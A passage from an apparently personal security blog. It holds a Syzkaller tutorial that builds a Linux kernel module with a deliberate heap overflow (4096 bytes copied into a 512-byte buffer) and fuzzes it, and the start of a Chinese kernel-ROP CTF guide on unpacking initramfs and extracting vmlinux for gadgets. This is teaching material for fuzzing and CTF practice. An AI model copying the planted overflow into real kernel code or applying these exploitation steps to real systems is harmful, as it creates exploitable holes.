<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.img&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/arch/x86/boot/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span> <span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;net.ifnames=0&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>run Syzkaller by:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-manager -config=./default.cfg -debug</span><br></pre></td></tr></table></figure>

<p>meanwhile explorer 127.0.0.1:56741 to get a view of the current fuzzing state</p>
<h2 id="0x2-demo"><a href="#0x2-demo" class="headerlink" title="0x2 demo"></a>0x2 demo</h2><p>take a kernel heap overflow for example.</p>
<h3 id="1-build-a-vulnability-kernel-module"><a href="#1-build-a-vulnability-kernel-module" class="headerlink" title="1.build a vulnability kernel module"></a>1.build a vulnability kernel module</h3><p>this module contains a heap overflow in function proc_write, and we will compile it directly into the kernel</p>
<p>up to 4096 bytes can be written to a narrow 512 Byte slab object in cache kmalloc-512</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">proc_open</span> <span class="params">(<span class="keyword">struct</span> inode *proc_inode, <span class="keyword">struct</span> file *proc_file)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;:into open!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">proc_read</span> <span class="params">(<span class="keyword">struct</span> file *proc_file, <span class="type">char</span> __user *proc_user, <span class="type">size_t</span> n, <span class="type">loff_t</span> *loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;:into read&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">proc_write</span> <span class="params">(<span class="keyword">struct</span> file *proc_file, <span class="type">const</span> <span class="type">char</span> __user *proc_user, <span class="type">size_t</span> n, <span class="type">loff_t</span> *loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *c = kmalloc(<span class="number">512</span>, GFP_KERNEL);</span><br><span class="line">    copy_from_user(c, proc_user, <span class="number">4096</span>);</span><br><span class="line">    printk(<span class="string">&quot;:into write!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">test_op</span> =</span> &#123;</span><br><span class="line">    .proc_open = proc_open,</span><br><span class="line">    .proc_read = proc_read,</span><br><span class="line">    .proc_write = proc_write,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mod_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    proc_create(<span class="string">&quot;test1&quot;</span>, S_IRUGO|S_IWUGO, <span class="literal">NULL</span>, &amp;test_op);</span><br><span class="line">    printk(<span class="string">&quot;:proc init over!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(mod_init);</span><br></pre></td></tr></table></figure>

<p>save as <code>linux-5.14/drivers/char/testxy.c</code></p>
<p>then append following to </p>
<p><code>linux-5.14/drivers/char/Kconfig</code></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">config</span> <span class="string">TESTXY_MODULE</span></span><br><span class="line">  <span class="string">tristate</span> <span class="string">&quot;dustball&#x27;s vulnability module&quot;</span></span><br><span class="line">  <span class="string">default</span> <span class="string">y</span></span><br><span class="line">  <span class="string">help</span></span><br><span class="line">    <span class="string">This</span> <span class="string">file</span> <span class="string">is</span> <span class="string">to</span> <span class="string">test</span> <span class="string">a</span> <span class="string">buffer</span> <span class="string">overflow</span></span><br></pre></td></tr></table></figure>



<p>then append following to </p>
<p><code>linux-5.14/drivers/char/Makefile</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj-<span class="variable">$(CONFIG_TESTXY_MODULE)</span> += testxy.o</span><br></pre></td></tr></table></figure>



<p>reconfig the kernel with </p>
<p><code>make menuconfig</code></p>
<p>we can find the module @Device Drivers&#x2F;dustball’s vulnability module</p>
<blockquote>
<p><code>*</code> means compile into the kernel, chosen</p>
<p><code>M</code> means compile as independent module</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20241221203510528.png" alt="image-20241221203510528"></p>
<p>recompile the kernel</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j `<span class="built_in">nproc</span>`</span><br></pre></td></tr></table></figure>



<p>rerun the kernel and check the module loaded</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /proc/test1</span><br></pre></td></tr></table></figure>



<h3 id="2-provide-syscall-descriptions"><a href="#2-provide-syscall-descriptions" class="headerlink" title="2.provide syscall descriptions"></a>2.provide syscall descriptions</h3><p>2.1 save the following syscall descriptions as</p>
<p> <code>/syzkaller/sys/linux/proc_testxy.txt</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">include &lt;linux/fs.h&gt;</span><br><span class="line">open$testxy(file ptr[in, <span class="built_in">string</span>[<span class="string">&quot;/proc/test1&quot;</span>]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd</span><br><span class="line">read$testxy(fd fd, buf buffer[out], count len[buf])</span><br><span class="line">write$testxy(fd fd, buf buffer[in], count len[buf])</span><br><span class="line"></span><br><span class="line">proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure>

<blockquote>
<p>more syzlang :</p>
<p><a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md">https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md</a></p>
</blockquote>
<p>2.2 extract necessary information like syscall numbers and macro values using syz-extract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">./bin/syz-extract -os linux -arch amd64 -sourcedir &quot;/path/to/linux-5.14&quot; proc_testxy.txt</span><br></pre></td></tr></table></figure>

<p>check  <code>syzkaller/sys/linux/proc.testxy.txt.const</code>  when finished</p>
<p>2.3 generate syzkaller-awareness datastructure in golang </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">./bin/syz-sysgen</span><br></pre></td></tr></table></figure>

<p>check <code>syzkaller/executor/syscalls.h</code> to find <code>read$testxy</code> when finished</p>
<p>2.4 rebuild Syzkaller</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make generate </span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h3 id="3-start-Syzkaller"><a href="#3-start-Syzkaller" class="headerlink" title="3.start Syzkaller"></a>3.start Syzkaller</h3><p>edit a test.cfg file</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.img&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sandbox&quot;</span><span class="punctuation">:</span> <span class="string">&quot;setuid&quot;</span><span class="punctuation">,</span></span><br><span class="line">        	<span class="attr">&quot;enable_syscalls&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        		<span class="string">&quot;open$testxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        		<span class="string">&quot;read$testxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        		<span class="string">&quot;write$testxy&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/arch/x86/boot/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span> <span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;net.ifnames=0&quot;</span> </span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>then run Syzkaller by</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> syzkaller</span><br><span class="line">./bin/syz-manager -config=./test.cfg -debug</span><br></pre></td></tr></table></figure>

<p>visit <a target="_blank" rel="noopener" href="http://127.0.0.1:56741/">http://127.0.0.1:56741/</a> and wait for crash reports</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20241221210627723.png" alt="image-20241221210627723"></p>
<h2 id="0x3-see-also"><a href="#0x3-see-also" class="headerlink" title="0x3 see also"></a>0x3 see also</h2><p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2019/10/26/syzkaller/">https://blingblingxuanxuan.github.io/2019/10/26/syzkaller/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/11/26/kernel%20rop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/26/kernel%20rop/" class="post-title-link" itemprop="url">kernel rop</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-26 21:17:00" itemprop="dateCreated datePublished" datetime="2024-11-26T21:17:00+08:00">2024-11-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-21 21:09:19" itemprop="dateModified" datetime="2024-12-21T21:09:19+08:00">2024-12-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernel-pwn"><a href="#kernel-pwn" class="headerlink" title="kernel pwn"></a>kernel pwn</h1><h2 id="environment-setup"><a href="#environment-setup" class="headerlink" title="environment setup"></a>environment setup</h2><p>通常<code>linux kernel pwn</code>题目标是在一个有漏洞的内核模块上搞破坏</p>
<p>赛题会给这么几样东西</p>
<p><code>initramfs.cpio.gz</code>或者类似的名字: 内存文件系统, 通常是基于<code>busybox</code>构建的一个最简的<code>linux</code> 文件系统目录, 其中包含有漏洞的内核模块</p>
<p><code>vmlinuz</code>: 内核镜像</p>
<p><code>run.sh</code>: <code>qemu</code>启动脚本,<code>qemu</code>会基于上述<code>vmlinuz</code>和<code>initramfs</code>启动一个虚拟机</p>
<h3 id="initramfs-cpio-gz"><a href="#initramfs-cpio-gz" class="headerlink" title="initramfs.cpio.gz"></a>initramfs.cpio.gz</h3><p>这玩意儿是两层打包之后的文件系统, <code>cpio</code>包外面又套了一个<code>gz</code>包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip initramfs.cpio.gz</span><br></pre></td></tr></table></figure>

<p>得到<code>initramfs.cpio</code>包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; ./initramfs.cpio</span><br></pre></td></tr></table></figure>

<p>得到一个<code>linux</code>目录结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop/test<span class="meta"># ls</span></span><br><span class="line">bin  etc  geninitramfs.sh  hackme.ko  init  initramfs.cpio  root  sbin  usr</span><br></pre></td></tr></table></figure>

<p>通常这个目录简单得很</p>
<p><code>hackme.ko</code>: 存在漏洞的内核模块</p>
<p><code>init</code>: 由<code>shell</code>或者<code>c</code>编写的启动脚本</p>
<p><code>bin</code>: 由<code>busybox</code>实现的<code>linux</code>命令集</p>
<p><code>etc</code>: <code>etc</code>下的<code>inittab</code>或者<code>init.d/rcS</code>中有更多的开机启动项目, 比如设置<code>uid</code>或者加载内核模块等</p>
<h4 id="cpio"><a href="#cpio" class="headerlink" title="cpio"></a>cpio</h4><h5 id="cpio是什么"><a href="#cpio是什么" class="headerlink" title="cpio是什么?"></a>cpio是什么?</h5><p><code>CPIO(Copy In Copy Out)</code>, 在早期<code>linux</code>系统中用于将多个文档打包成一个文档传输然后再解包</p>
<h5 id="为什么使用cpio"><a href="#为什么使用cpio" class="headerlink" title="为什么使用cpio?"></a>为什么使用<code>cpio</code>?</h5><p>内核只认<code>cpio</code>打包的<code>initramfs</code>文件包</p>
<h5 id="如何使用cpio"><a href="#如何使用cpio" class="headerlink" title="如何使用cpio?"></a>如何使用<code>cpio</code>?</h5><p><code>cpio</code>命令用起来很诡异, 有各种管道或者重定向符号</p>
<p>这是因为<code>cpio</code>默认从标准输入获取数据, 并输出到标准输出</p>
<p>因此将多个文件打包输出成一个文件需要将标准输入输出重定向到文件流</p>
<p><code>cpio</code>有三种工作模式:<code>copy-out,copy-in，copy-pass</code></p>
<p><code>1.copy-out</code>: 把文件打包, 默认输出到标准输出, 通常重定向到文件, 比如</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure>

<p>首先查找当前目录下所有文件, 获得文件名列表</p>
<p>​      <code>-print0</code>:文件名以<code>\x00</code>分割</p>
<p>然后管道交给cpio归档</p>
<p>​	<code>--null</code>:文件名以<code>\x00</code>分割</p>
<p>​        <code>-o</code>: 输出</p>
<p>​	<code>-v</code>: verbose, 详细模式, 打印工作过程</p>
<p>​	<code>--format=newc</code> : 以<code>newc</code>格式归档</p>
<p>然后管道交给gzip压缩</p>
<p>​	<code>-9</code>最高压缩级别</p>
<p>然后重定向到文件输出</p>
<p>2.<code>copy-in</code>:解包, 默认从标准输入读包, 通常重定向到文件输入, 比如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; ./initramfs.cpio</span><br></pre></td></tr></table></figure>

<p>重定向输入为<code>./initramfs.cpio</code>文件</p>
<p><code>-i</code>: 解包</p>
<p><code>-d</code>: 自动建立相应目录</p>
<p><code>-m</code>: 保留文件修改日期</p>
<p>3.<code>copy-pass</code>: 将一个目录树拷贝到另一个目录下, 只是一个搬运</p>
<h4 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h4><h5 id="etc-inittab"><a href="#etc-inittab" class="headerlink" title="&#x2F;etc&#x2F;inittab"></a>&#x2F;etc&#x2F;inittab</h5><p><code>inittab</code>可以看作<code>init</code>进程的配置文件，规定<code>init</code>进程需要执行的初始化任务</p>
<p><img src="https://images2018.cnblogs.com/blog/1436095/201807/1436095-20180709194017319-1896253481.png" alt="img"></p>
<p><code>inittab</code>中每一行都按照下述语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label:runlevel:action:process</span><br></pre></td></tr></table></figure>

<p><code>label</code>: 就是一个命名, 给本行登记项一个唯一标识</p>
<p><code>runlevel</code>: 指定任务运行级</p>
<p><code>action</code>: 指定命令执行时机</p>
<p><code>process</code>: 需要执行的<code>shell</code>命令</p>
<p>比如在<code>kernel-rop</code>这道题中是这样写的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::once:-sh -c <span class="string">&#x27;cat /etc/motd; setuidgid 1000 /bin/sh; poweroff&#x27;</span></span><br></pre></td></tr></table></figure>

<p>1.在系统初始化时执行<code>/etc/init.d/rcS</code></p>
<p>2.执行一次打印<code>/etc/motd</code>然后设置普通用户权限(1000), 然后起低权限的<code>shell</code></p>
<h5 id="etc-init-d-rcS"><a href="#etc-init-d-rcS" class="headerlink" title="&#x2F;etc&#x2F;init.d&#x2F;rcS"></a>&#x2F;etc&#x2F;init.d&#x2F;rcS</h5><p>这个<code>/etc/init.d/rcS</code>干了啥呢?</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">/bin/busybox --install -s			<span class="comment">#在/usr/bin下面创建ls,mkdir等一系列命令,链接到/usr/bin/busybox</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>						<span class="comment">#set tty, 设置终端上打印行为, 挺怪异的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /						<span class="comment">#所有文件变更拥有者为root</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /proc &amp;&amp; mount -t proc none /proc</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev  &amp;&amp; mount -t devtmpfs devtmpfs /dev</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp  &amp;&amp; mount -t tmpfs tmpfs /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict			<span class="comment">#禁止普通用户查看/proc/kallsyms</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict		<span class="comment">#禁止普通用户查看dmesg信息</span></span><br><span class="line"><span class="built_in">chmod</span> 400 /proc/kallsyms						<span class="comment">#/proc/kallsyms对root只读,其他用户不可访问</span></span><br><span class="line"></span><br><span class="line">insmod /hackme.ko								<span class="comment">#加载内核模块</span></span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/hackme							<span class="comment">#允许所有用户读写访问内核模块hackme.ko的接口/dev/hackme</span></span><br></pre></td></tr></table></figure>

<p>由于<code>inittab</code>中已经将用户限制为普通用户(<code>1000</code>), 此时是看不到<code>dmesg</code>以及<code>kallsym</code>的, </p>
<p>因此可以修改<code>inittab</code>中的用户<code>id</code>,从<code>1000</code>改成0,然后重新打包,启动虚拟机,此时就是<code>root</code>用户了</p>
<h3 id="vmlinuz"><a href="#vmlinuz" class="headerlink" title="vmlinuz"></a>vmlinuz</h3><p><code>vmlinuz </code>就是<code>bzImage</code>,也就是可以引导的内核镜像</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># file vmlinuz</span></span><br><span class="line">vmlinuz: Linux kernel x86 boot executable bzImage, version <span class="number">5.9</span><span class="number">.0</span>-rc6+ (martin@martin) #<span class="number">10</span> SMP Sun Nov <span class="number">22</span> <span class="number">16</span>:<span class="number">47</span>:<span class="number">32</span> CET <span class="number">2020</span>, RO-rootFS, swap_dev <span class="number">0X7</span>, Normal VGA</span><br></pre></td></tr></table></figure>

<p><code>vmlinux</code>是内核<code>elf</code>文件, 而<code>vmlinuz</code>是可引导的, 经过压缩的内核</p>
<p>为了提取内核中的<code>gadget</code>, 我们需要有<code>vmlinux elf</code>文件</p>
<p>可以使用<code>vmlinux-to-elf</code>或者<code>extract-vmlinux</code>工具从<code>vmlinuz</code>中提取<code>vmlinux</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf ./vmlinuz ./vmlinux</span><br></pre></td></tr></table></figure>

<p>提取完成后生成vmlinux elf文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# file vmlinuz</span><br><span class="line">vmlinuz: Linux kernel x86 boot executable bzImage, version 5.9.0-rc6+ (martin@martin) <span class="comment">#10 SMP Sun Nov 22 16:47:32 CET 2020, RO-rootFS, swap_dev 0X7, Normal VGA</span></span><br><span class="line">root@Destroyer:/usr/src/kernel-rop# file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), too many program (36106)</span><br></pre></td></tr></table></figure>

<p>接下来使用<code>ROPgadget</code>提取<code>vmlinux</code>中的<code>gadgets</code>,写入文件准备使用</p>
